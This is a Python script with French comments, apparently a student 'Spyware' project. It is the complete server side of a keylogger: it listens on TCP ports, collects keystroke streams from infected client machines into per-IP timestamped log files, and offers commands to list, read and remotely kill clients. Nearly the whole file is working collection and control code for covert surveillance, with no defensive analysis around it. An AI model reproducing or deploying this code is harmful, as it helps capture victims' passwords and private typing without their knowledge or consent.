#!/usr/bin/env python3.12
# Réalisé par ***
# Projet : Spyware
# Description du projet : Réalisation d'un spyware en Python avec une partie serveur et une partie client
# Date de rendu : 31/01/2024

import argparse
import socket
import signal
import datetime
import threading
import os
import time

# Variables globales
running = True
server_socket = None
client_sockets = []
server_threads = []  # Stockage des threads d'écoute

def print_help():
    """ Affiche les commandes disponibles pour le serveur. """
    print("Commandes disponibles :")
    print("  help - Affiche cette liste de commandes")
    print("  kill - Arrête toutes les instances du serveur")
    print("  show - Affiche la liste des fichiers réceptionnés")
    print("  readfile <filename> - Affiche le contenu d'un fichier spécifié")
    print("  listen <port> - Se mettre en écoute sur le port TCP spécifié")

def send_kill_to_clients():
    """ Envoie un signal de fermeture aux clients connectés. """
    for client_socket in client_sockets:
        try:
            client_socket.send("kill".encode())
        except:
            pass

def stop_server(return_to_menu=False):
    """ Arrête le serveur et ferme les connexions clients. """
    global running, server_socket, client_sockets, server_threads
    running = False

    # Fermeture des connexions clients
    for client_socket in client_sockets:
        try:
            client_socket.shutdown(socket.SHUT_RDWR)
            client_socket.close()
        except Exception as e:
            print(f"Erreur lors de la fermeture du socket client : {e}")

    # Fermeture du socket serveur
    if server_socket:
        server_socket.close()

    # Attente de la fin des threads d'écoute
    for thread in server_threads:
        if thread.is_alive():
            thread.join()

    client_sockets.clear()
    server_threads.clear()

    if not return_to_menu:
        exit(0)
    else:
        running = True
        print("Serveur arrêté. Vous pouvez entrer de nouvelles commandes.")

def show_files():
    """ Affiche les fichiers de log capturés. """
    files = [f for f in os.listdir('.') if f.endswith('-keyboard.txt')]
    if not files:
        print("Aucun fichier trouvé.")
        return
    print("Fichiers capturés :")
    for file in files:
        print(file)

def read_file(filename):
    """ Lit et affiche le contenu du fichier de log spécifié. """
    if os.path.exists(filename):
        with open(filename, 'r') as file:
            content = file.read()
            print(content)
    else:
        print("Fichier non trouvé.")

def generate_filename(client_ip):
    """ Génère un nom de fichier pour les logs (basé sur l'IP et la date actuelle)"""
    current_time = datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
    return f"{client_ip}-{current_time}-keyboard.txt"

def start_server(port):
    """ Démarre un serveur d'écoute sur un port spécifié. """
    global server_socket, client_sockets, running
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('', port))
    server_socket.listen()
    print(f"Serveur en écoute sur le port {port}...")

    while running:
        try:
            client_socket, addr = server_socket.accept()
            client_sockets.append(client_socket)
            handle_client_connection(client_socket, addr)
        except socket.error as e:
            if running:
                print("Erreur de socket, mais le serveur continue de fonctionner")

def handle_client_connection(client_socket, addr):
    """ Gère une connexion client. """
    print(f"{addr[0]} vient de se connecter")
    filename = generate_filename(addr[0])
    with open(filename, 'ab') as file:
        while running:
            data = client_socket.recv(1024)
            if not data:
                break
            file.write(data)
            file.flush()
    print(f"Données enregistrées dans {filename}")

def process_command(cmd):
    """ Traite une commande entrée par l'utilisateur. """
    global running, server_threads

    if not cmd.strip():
        print("Aucune commande saisie. Tapez 'help' pour la liste des commandes.")
        return

    parts = cmd.split(maxsplit=1)
    command = parts[0]
    argument = parts[1] if len(parts) > 1 else None

    if command == "help":
        print_help()
    elif command == "kill":
        send_kill_to_clients()
        stop_server(return_to_menu=True)
    elif command == "show":
        show_files()
    elif command == "readfile":
        if not argument:
            print("Erreur : Nom de fichier manquant pour la commande 'readfile'.")
            return
        read_file(argument)
    elif command == "listen":
        if not argument:
            print("Erreur : Numéro de port manquant pour la commande 'listen'.")
            return
        start_listening(int(argument))
    else:
        print(f"Commande inconnue : {command}")

def signal_handler(sig, frame):
    """ Gère les signaux d'interruption (comme CTRL+C). """
    print("\nArrêt du serveur via CTRL+C.")
    send_kill_to_clients()
    time.sleep(2)  # Temps pour envoyer le signal de fermeture
    stop_server()
    os._exit(0)

def start_listening(port):
    """ Lance un nouveau thread d'écoute sur un port spécifié. """
    global server_threads
    if any(thread.name == f"server_thread_{port}" for thread in server_threads):
        print(f"Le serveur écoute déjà sur le port {port}.")
        return

    new_thread = threading.Thread(target=start_server, args=(port,), name=f"server_thread_{port}")
    new_thread.start()
    server_threads.append(new_thread)
    print(f"Démarrage de l'écoute sur le port {port}.")

if __name__ == "__main__":
    # Configuration et exécution du serveur
    parser = argparse.ArgumentParser(description="Serveur pour réceptionner les données du spyware.")
    parser.add_argument("-l", "--listen", type=int, help="listen [port] permet d'écouter le port spécifié en TCP.")
    parser.add_argument("-s", "--show", action="store_true", help="Affiche la liste des fichiers des données reçus.")
    parser.add_argument("-r", "--readfile", type=str, help="show [nom_fichier] affiche le contenu du fichier spécifié.")
    parser.add_argument("-k", "--kill", action="store_true", help="Arrête toutes les instances du serveur.")
    args = parser.parse_args()

    signal.signal(signal.SIGINT, signal_handler)
    if args.listen:
        start_listening(args.listen)
    if args.show:
        show_files()
    if args.readfile:
        read_file(args.readfile)
    if args.kill:
        stop_server()

    print("Serveur prêt. Entrez une commande (tapez 'help' pour la liste des commandes).")
    while True:
        cmd = input("> ")
        process_command(cmd)
